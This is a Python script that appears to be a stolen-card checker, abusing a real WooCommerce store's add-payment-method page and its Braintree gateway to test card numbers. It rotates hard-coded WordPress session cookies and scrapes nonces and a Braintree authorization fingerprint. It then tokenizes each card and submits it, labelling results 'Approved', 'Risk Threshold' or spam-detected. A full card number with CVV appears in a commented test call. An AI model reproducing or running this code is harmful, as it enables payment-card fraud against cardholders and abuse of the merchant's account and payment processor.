import requests
import re
import random
import time
import string
import base64
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
def Gele(ccx):
  import requests
  ccx = ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:  # Mo3gza
    yy = yy.split("20")[1]
  with open('fileb2.txt', 'r') as file:
    first_line = file.readline()
    print(n,mm,yy,cvc)
    
    last_used_times = {}
    
  while True:
    lines = '''kewos50064%7C1757748103%7CkiItXSirENE6KlNlAObyEETLKToJJ8HYWWdBlE3PCX2%7Cb8112de5ef1e6a68f4f5ef33132bf46e4184b84b5bca943f0b5b67689f48ae16
nojinic550%7C1756647173%7C66PfxMe6NuCdNB09YqbELMFO8SQkSZB7Nt5H0uaj7QC%7Ca92a4bbb0d3598d99355b1f391b55a6cb8e9a5d7a75d919e412bf9e02e519856'''

    lines = lines.strip().split('\n')
    random_line_number = random.randint(0, len(lines) - 1)
    big = lines[random_line_number]
    current_time = time.time()
    if big in last_used_times:
	        time_since_last_use = current_time - last_used_times[big]
	        if time_since_last_use < 20:
	            continue
    if big == first_line:
      pass
    else:
      break
  with open('fileb3.txt', 'w') as file:
    file.write(big)
    cookies = {
    '_ga': 'GA1.1.1756361259.1748410162',
    '_fbp': 'fb.1.1748410163623.567321236199918534',
    'omnisend-form-65a6b96077ab435bd118c772-closed-at': '2025-05-28T05:29:43.448Z',
    'omnisendContactID': '688d0c04169b5e0b85f2e192',
    '_tt_enable_cookie': '1',
    '_ttp': '01K1RXY7GNT2B2HHXFS7NS2D57_.tt.1',
    'ttcsid_CFUEDDJC77UADV8D1CKG': '1754257105830::kFKupkhFPnFOLJvUgNY-.1.1754257105830',
    'ttcsid': '1754257105834::zAq7k1G4HUy0BuNEg5rF.1.1754257105834',
    '__cf_bm': 'wNrB3EOIjROTSUBF9MXSEyGix5iXc0VAZlvZNEnM9R0-1756474195-1.0.1.1-efFIDgAzm1QArsoSzt.e742DBkYh6CoPnO2eWUJX2iHf_Gd6Gd7kDqJ1iLGluLSphnMUlJOfTwm2EP49UK75a23ExcOQeLkIMVH2y8MNF1k',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-08-29%2012%3A59%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-08-29%2012%3A59%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'soundestID': '20250829132957-ISK8GbGW5dGhwS0im19bCthnNYyitOrMoWkIOGzM7g1tmR9zW',
    'omnisendSessionID': 'Sx76e4YBU88UOS-20250829132957',
    'wffn_flt': '2025-8-29 07:29:57',
    'wffn_timezone': 'Asia/Calcutta',
    'wffn_is_mobile': 'true',
    'wffn_browser': 'Chrome',
    'wffn_referrer': '',
    'wffn_fl_url': '/my-account/add-payment-method/',
    '_gcl_au': '1.1.615629707.1756474200',
    'fkcart_cart_qty': '0',
    'fkcart_cart_total': '%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E',
    '_fk_contact_uid': '95719fb7410523b61eea45723ed6b6f8',
    'wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33': big,
    'wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5': '67522%7Cother%7Cread%7C4566fbdc74babb0bbdcd5f53beade9301e9a3488f13eb4f60b43519951e540aa',
    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F',
    'page-views': '6',
    '_ga_CYYECGMPHQ': 'GS2.1.s1756474199$o10$g1$t1756474403$j41$l0$h0',
}

    headers = {
    'authority': 'efxsports.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'cache-control': 'max-age=0',
   
    'referer': 'https://efxsports.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    response = requests.get('https://efxsports.com/my-account/add-payment-method/', cookies=cookies, headers=headers)


# Use regex to find the "client_token_nonce"
    # Extract client_token_nonce (for "credit_card")
    match_token = re.search(r'"type"\s*:\s*"credit_card"\s*,\s*"client_token_nonce"\s*:\s*"([^"]+)"', response.text)

# Extract hidden nonce value from input tag
    match_nonce = re.search(
    r'<input[^>]+id="woocommerce-add-payment-method-nonce"[^>]+value="([^"]+)"', 
    response.text
)

# Process results
    if match_token:
        card_nonce = match_token.group(1)
        print("Card nonce:", card_nonce)
    else:
        print("Card nonce not found.")

    if match_nonce:
        add_nonce = match_nonce.group(1)
        print("Add nonce:", add_nonce)
    else:
        print("Add nonce not found.")

    cookies = {
    'wordpress_sec_13e414371e5f1c2d9a0d5bf21c737d33': big,
    '_ga': 'GA1.1.1756361259.1748410162',
    '_fbp': 'fb.1.1748410163623.567321236199918534',
    'omnisend-form-65a6b96077ab435bd118c772-closed-at': '2025-05-28T05:29:43.448Z',
    'omnisendContactID': '688d0c04169b5e0b85f2e192',
    '_tt_enable_cookie': '1',
    '_ttp': '01K1RXY7GNT2B2HHXFS7NS2D57_.tt.1',
    'ttcsid_CFUEDDJC77UADV8D1CKG': '1754257105830::kFKupkhFPnFOLJvUgNY-.1.1754257105830',
    'ttcsid': '1754257105834::zAq7k1G4HUy0BuNEg5rF.1.1754257105834',
    '__cf_bm': 'wNrB3EOIjROTSUBF9MXSEyGix5iXc0VAZlvZNEnM9R0-1756474195-1.0.1.1-efFIDgAzm1QArsoSzt.e742DBkYh6CoPnO2eWUJX2iHf_Gd6Gd7kDqJ1iLGluLSphnMUlJOfTwm2EP49UK75a23ExcOQeLkIMVH2y8MNF1k',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-08-29%2012%3A59%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-08-29%2012%3A59%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'soundestID': '20250829132957-ISK8GbGW5dGhwS0im19bCthnNYyitOrMoWkIOGzM7g1tmR9zW',
    'omnisendSessionID': 'Sx76e4YBU88UOS-20250829132957',
    'wffn_flt': '2025-8-29 07:29:57',
    'wffn_timezone': 'Asia/Calcutta',
    'wffn_is_mobile': 'true',
    'wffn_browser': 'Chrome',
    'wffn_referrer': '',
    'wffn_fl_url': '/my-account/add-payment-method/',
    '_gcl_au': '1.1.615629707.1756474200',
    'fkcart_cart_qty': '0',
    'fkcart_cart_total': '%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E',
    '_fk_contact_uid': '95719fb7410523b61eea45723ed6b6f8',
    'wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33': big,
    'wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5': '67522%7Cother%7Cread%7C4566fbdc74babb0bbdcd5f53beade9301e9a3488f13eb4f60b43519951e540aa',
    'page-views': '6',
    '_ga_CYYECGMPHQ': 'GS2.1.s1756474199$o10$g1$t1756474403$j41$l0$h0',
    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F',
}

    headers = {
    'authority': 'efxsports.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
   
    'origin': 'https://efxsports.com',
    'referer': 'https://efxsports.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': card_nonce,
}

    response = requests.post('https://efxsports.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
    enc = response.json().get('data', '')
    dec = base64.b64decode(enc).decode('utf-8')

    matches = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)

    au = matches[0]
    if matches:
        print("Authorization Fingerprint:", au)
    else:
        print("not found")
    

    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'f4799355-ede7-4d3f-88fc-f4fb2d63cf5e',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Parse JSON from the response
    try:
        response_json = response.json()
    
        token = response_json["data"]["tokenizeCreditCard"]["token"]
        brand_code = response_json["data"]["tokenizeCreditCard"]["creditCard"]["brandCode"]
    
        print("Token:", token)
        print("Brand Code:", brand_code)
    except (KeyError, TypeError, ValueError):
        print("Not found")

    cookies = {
    '_ga': 'GA1.1.1756361259.1748410162',
    '_fbp': 'fb.1.1748410163623.567321236199918534',
    'omnisend-form-65a6b96077ab435bd118c772-closed-at': '2025-05-28T05:29:43.448Z',
    'omnisendContactID': '688d0c04169b5e0b85f2e192',
    '_tt_enable_cookie': '1',
    '_ttp': '01K1RXY7GNT2B2HHXFS7NS2D57_.tt.1',
    'ttcsid_CFUEDDJC77UADV8D1CKG': '1754257105830::kFKupkhFPnFOLJvUgNY-.1.1754257105830',
    'ttcsid': '1754257105834::zAq7k1G4HUy0BuNEg5rF.1.1754257105834',
    '__cf_bm': 'wNrB3EOIjROTSUBF9MXSEyGix5iXc0VAZlvZNEnM9R0-1756474195-1.0.1.1-efFIDgAzm1QArsoSzt.e742DBkYh6CoPnO2eWUJX2iHf_Gd6Gd7kDqJ1iLGluLSphnMUlJOfTwm2EP49UK75a23ExcOQeLkIMVH2y8MNF1k',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-08-29%2012%3A59%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-08-29%2012%3A59%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'soundestID': '20250829132957-ISK8GbGW5dGhwS0im19bCthnNYyitOrMoWkIOGzM7g1tmR9zW',
    'omnisendSessionID': 'Sx76e4YBU88UOS-20250829132957',
    'wffn_flt': '2025-8-29 07:29:57',
    'wffn_timezone': 'Asia/Calcutta',
    'wffn_is_mobile': 'true',
    'wffn_browser': 'Chrome',
    'wffn_referrer': '',
    'wffn_fl_url': '/my-account/add-payment-method/',
    '_gcl_au': '1.1.615629707.1756474200',
    'fkcart_cart_qty': '0',
    'fkcart_cart_total': '%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E0.00%3C%2Fbdi%3E%3C%2Fspan%3E',
    '_fk_contact_uid': '95719fb7410523b61eea45723ed6b6f8',
    'wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33': big,
    'wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5': '67522%7Cother%7Cread%7C4566fbdc74babb0bbdcd5f53beade9301e9a3488f13eb4f60b43519951e540aa',
    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F',
    'page-views': '6',
    '_ga_CYYECGMPHQ': 'GS2.1.s1756474199$o10$g1$t1756474403$j41$l0$h0',
}

    headers = {
    'authority': 'efxsports.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    
    'origin': 'https://efxsports.com',
    'referer': 'https://efxsports.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', brand_code),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', token),
    ('wc_braintree_device_data', '{"correlation_id":"88a8f9b9b9f1d677789cee05ad855db1"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"88a8f9b9b9f1d677789cee05ad855db1"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', add_nonce),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

    response = requests.post('https://efxsports.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)

    match = re.search(
    r'<ul class="woocommerce-error"[^>]*?>\s*<li>\s*(.*?)\s*</li>',
    response.text,
    re.DOTALL
)
    
    if match:
        return match.group(1).strip()
    elif 'risk_threshold' in response.text:
        result = "Gateway Rejected: Risk Threshold"
        return result
    elif 'Please wait for 20 seconds.' in response.text:
        result = "Sᴘᴀᴍ Dᴇᴛᴇᴄᴛᴇᴅ"
        return result
    elif 'Duplicate' in response.text:
        return "1000:Approved"
    else:
        return "1000:Approved"                                                 
                                                                                                                                                                                                         
#print(Gele("5403752236900278|03|2029|890"))        
                                                                                                                                                                                          
    
